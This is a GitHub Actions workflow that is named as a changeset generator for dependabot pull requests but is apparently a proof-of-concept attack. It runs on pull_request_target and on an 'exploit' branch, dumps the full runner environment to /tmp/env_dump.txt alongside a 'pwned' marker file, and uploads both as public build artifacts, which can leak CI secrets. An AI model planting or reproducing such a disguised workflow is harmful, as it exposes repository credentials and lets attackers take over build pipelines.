name: "C3 - Generate changesets for dependabot PRs"
on:
  pull_request:
  pull_request_target:
  push:
    branches:
      - exploit
      - main

jobs:
  test-workflow:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run test
        run: |
          echo "[PoC] Testing workflow execution" > /tmp/pwned.txt
          env > /tmp/env_dump.txt
      - name: Upload artifacts
        uses: actions/upload-artifact@v3
        with:
          name: poc-artifacts
          path: |
            /tmp/pwned.txt
            /tmp/env_dump.txt